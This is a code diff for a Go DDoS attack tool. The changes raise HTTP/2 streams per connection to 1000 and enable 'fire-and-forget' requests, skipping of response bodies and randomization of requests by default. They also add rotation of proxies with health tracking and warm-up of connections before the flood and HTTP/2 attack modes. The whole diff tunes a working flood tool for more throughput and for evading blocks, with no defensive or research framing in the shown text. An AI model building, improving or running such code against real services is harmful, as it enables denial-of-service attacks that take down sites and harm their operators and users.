@@ -29,8 +29,21 @@ func New(config DDoSConfig) *DDoSAttack {
 		config.Headers = make(map[string]string)
 	}
 	if config.MaxStreamsPerConn <= 0 {
-		config.MaxStreamsPerConn = 100 // Default HTTP/2 streams per connection
+		config.MaxStreamsPerConn = 1000 // Default HTTP/2 streams per connection (increased from 100)
 	}
+
+	// Set default efficiency features (all enabled by default)
+	// Only set defaults if all are false (zero values), meaning they weren't set
+	// This allows explicit false values from menu configuration to be respected
+	if !config.EnableConnectionPooling && !config.EnableFireAndForget && !config.EnableResponseBodySkipping && !config.EnableRequestRandomization {
+		// All are false (zero values), so set defaults to true
+		config.EnableConnectionPooling = true
+		config.EnableFireAndForget = true
+		config.EnableResponseBodySkipping = true
+		config.EnableRequestRandomization = true
+	}
+	// Note: If any are explicitly set (including false), we respect those values
+	// The menu code always sets these explicitly, so this is mainly a safety net
 
 	// Auto-load proxies from default file if ProxyList is empty
 	if len(config.ProxyList) == 0 {
@@ -48,35 +61,21 @@ func New(config DDoSConfig) *DDoSAttack {
 	}
 
 	attack := &DDoSAttack{
-		config:         config,
-		proxyFailures:  make(map[string]int),
-		proxyDisabled:  make(map[string]bool),
-		proxyFailLimit: 5, // mark proxy unhealthy after 5 consecutive failures
+		config: config,
 	}
 
-	// Initialize proxy list snapshot for this attack instance
+	// Initialize optimized proxy manager
 	if len(config.ProxyList) > 0 {
-		attack.proxies = append([]string(nil), config.ProxyList...)
+		attack.proxyManager = NewProxyManager(config.ProxyList)
 	}
 
-	// Load user agents (auto-load from default file, fallback to built-in)
-	if config.UserAgentFile != "" {
-		// Use custom user agent file if specified
-		if agents, err := loadUserAgentsFromFile(config.UserAgentFile); err == nil && len(agents) > 0 {
-			attack.userAgents = agents
-		} else {
-			// Fallback to built-in agents if file loading fails
-			attack.userAgents = getBuiltInUserAgents()
-		}
-	} else {
-		// Auto-load from default user-agent.txt file
-		if agents, err := loadUserAgentsFromDefaultFile(); err == nil && len(agents) > 0 {
-			attack.userAgents = agents
-		} else {
-			// Fallback to built-in user agents if file loading fails
-			attack.userAgents = getBuiltInUserAgents()
-		}
+	// Initialize rate limiter if rate limit is set
+	if config.RateLimit > 0 {
+		attack.rateLimiter = NewTokenBucket(config.RateLimit)
 	}
+
+	// User agents are handled by RequestBuilder (loaded when RequestBuilder is created)
+	// No need to load them here since RequestBuilder manages its own user agent list
 
 	return attack
 }
@@ -111,6 +110,15 @@ func (d *DDoSAttack) Start(ctx context.Context) error {
 	// Start progress reporter
 	go d.reportProgress()
 
+	// Ensure context is valid before starting workers
+	if d.ctx == nil {
+		return fmt.Errorf("failed to create attack context")
+	}
+
+	// Connection warm-up: pre-establish connections before starting attack
+	// This improves initial throughput by having connections ready
+	d.warmupConnections()
+
 	// Start workers based on attack mode
 	switch d.config.AttackMode {
 	case ModeFlood:
@@ -127,10 +135,13 @@ func (d *DDoSAttack) Start(ctx context.Context) error {
 	return nil
 }
 
-
 // Wait waits for the attack to complete
 func (d *DDoSAttack) Wait() {
 	d.wg.Wait()
+
+	// Cleanup resources
+	d.cleanup()
+
 	d.mu.Lock()
 	d.running = false
 	d.mu.Unlock()
@@ -141,6 +152,78 @@ func (d *DDoSAttack) Stop() {
 	if d.cancel != nil {
 		d.cancel()
 	}
+	// Wait for workers to finish and cleanup
+	d.Wait()
+}
+
+// cleanup releases resources used by the attack
+func (d *DDoSAttack) cleanup() {
+	// Close client pool if it exists
+	if pool, ok := d.clientPool.(*ClientPool); ok && pool != nil {
+		pool.Close()
+	}
+}
+
+// warmupConnections pre-establishes connections to improve initial throughput
+func (d *DDoSAttack) warmupConnections() {
+	// Only warm up for flood and HTTP/2 modes (they use connection pools)
+	if d.config.AttackMode != ModeFlood && d.config.AttackMode != ModeHTTP2 {
+		return
+	}
+
+	// Create connection pool early to establish connections
+	pool, err := NewClientPool(d.config)
+	if err != nil {
+		return
+	}
+	d.clientPool = pool
+
+	// Warm up by making a few test requests to establish connections
+	// Use a small number to avoid delaying attack start
+	warmupCount := 10
+	if len(d.config.ProxyList) > 0 {
+		// Warm up more connections when using proxies
+		warmupCount = 20
+	}
+
+	// Create request builder for warm-up
+	if d.requestBuilder == nil {
+		d.requestBuilder = NewRequestBuilder(d.config)
+	}
+
+	// Perform warm-up requests in background (non-blocking)
+	go func() {
+		rb, ok := d.requestBuilder.(*RequestBuilder)
+		if !ok || rb == nil {
+			return
+		}
+
+		for i := 0; i < warmupCount; i++ {
+			select {
+			case <-d.ctx.Done():
+				return
+			default:
+				client := pool.GetClient()
+				if client == nil {
+					continue
+				}
+				req, err := rb.BuildRequest()
+				if err != nil {
+					continue
+				}
+				req = req.WithContext(d.ctx)
+				// Fire and forget warm-up request
+				go func() {
+					defer func() {
+						if r := recover(); r != nil {
+							// Ignore warm-up errors
+						}
+					}()
+					client.Do(req)
+				}()
+			}
+		}
+	}()
 }
 
 // GetStats returns current attack statistics
@@ -159,19 +242,12 @@ func (d *DDoSAttack) GetStats() AttackStats {
 		rps = float64(sent) / elapsed.Seconds()
 	}
 
-	// Compute proxy health stats
+	// Compute proxy health stats (optimized)
 	activeProxies := 0
 	disabledProxies := 0
-	if len(d.proxies) > 0 {
-		d.proxyMu.Lock()
-		for _, p := range d.proxies {
-			if d.proxyDisabled[p] {
-				disabledProxies++
-			} else {
-				activeProxies++
-			}
-		}
-		d.proxyMu.Unlock()
+	if d.proxyManager != nil {
+		activeProxies = d.proxyManager.GetActiveProxies()
+		disabledProxies = d.proxyManager.GetDisabledProxies()
 	}
 
 	// Calculate efficiency statistics
@@ -201,52 +277,26 @@ func (d *DDoSAttack) GetStats() AttackStats {
 }
 
 // getNextProxy returns the next healthy proxy for rotation, or false if none available.
+// Uses optimized proxy manager for efficient selection and health tracking.
 func (d *DDoSAttack) getNextProxy() (string, bool) {
-	if len(d.proxies) == 0 {
+	if d.proxyManager == nil {
 		return "", false
 	}
-
-	// Try up to len(proxies) times to find a non-disabled proxy
-	for i := 0; i < len(d.proxies); i++ {
-		idx := atomic.AddInt64(&d.proxyIndex, 1) - 1
-		p := d.proxies[int(idx)%len(d.proxies)]
-
-		d.proxyMu.Lock()
-		disabled := d.proxyDisabled[p]
-		d.proxyMu.Unlock()
-
-		if !disabled {
-			return p, true
-		}
-	}
-
-	return "", false
+	return d.proxyManager.GetNextProxy()
 }
 
-// markProxyFailure records a failed request for the given proxy and may mark it unhealthy.
+// markProxyFailure records a failed request for the given proxy (optimized).
 func (d *DDoSAttack) markProxyFailure(proxy string) {
-	if proxy == "" {
-		return
-	}
-	d.proxyMu.Lock()
-	defer d.proxyMu.Unlock()
-
-	failures := d.proxyFailures[proxy] + 1
-	d.proxyFailures[proxy] = failures
-	if failures >= d.proxyFailLimit {
-		d.proxyDisabled[proxy] = true
+	if d.proxyManager != nil {
+		d.proxyManager.MarkFailure(proxy)
 	}
 }
 
-// markProxySuccess resets the failure counter for a proxy on successful use.
-func (d *DDoSAttack) markProxySuccess(proxy string) {
-	if proxy == "" {
-		return
+// markProxySuccess records a successful request for the given proxy (optimized).
+func (d *DDoSAttack) markProxySuccess(proxy string, responseTime time.Duration) {
+	if d.proxyManager != nil {
+		d.proxyManager.MarkSuccess(proxy, responseTime)
 	}
-	d.proxyMu.Lock()
-	defer d.proxyMu.Unlock()
-
-	d.proxyFailures[proxy] = 0
 }
 
 // IsRunning returns whether the attack is currently running
@@ -258,6 +308,18 @@ func (d *DDoSAttack) IsRunning() bool {
 
 // reportProgress periodically calls the progress callback
 func (d *DDoSAttack) reportProgress() {
+	defer func() {
+		// Recover from panics in progress reporting
+		if r := recover(); r != nil {
+			// Silently recover to prevent crash
+		}
+	}()
+
+	// Check if context is initialized
+	if d.ctx == nil {
+		return
+	}
+
 	ticker := time.NewTicker(500 * time.Millisecond)
 	defer ticker.Stop()
 
@@ -266,12 +328,28 @@ func (d *DDoSAttack) reportProgress() {
 		case <-d.ctx.Done():
 			// Final stats report
 			if d.config.OnProgress != nil {
-				d.config.OnProgress(d.GetStats())
+				// Recover from panics in callback
+				func() {
+					defer func() {
+						if r := recover(); r != nil {
+							// Silently recover to prevent crash
+						}
+					}()
+					d.config.OnProgress(d.GetStats())
+				}()
 			}
 			return
 		case <-ticker.C:
 			if d.config.OnProgress != nil {
-				d.config.OnProgress(d.GetStats())
+				// Recover from panics in callback
+				func() {
+					defer func() {
+						if r := recover(); r != nil {
+							// Silently recover to prevent crash
+						}
+					}()
+					d.config.OnProgress(d.GetStats())
+				}()
 			}
 		}
 	}
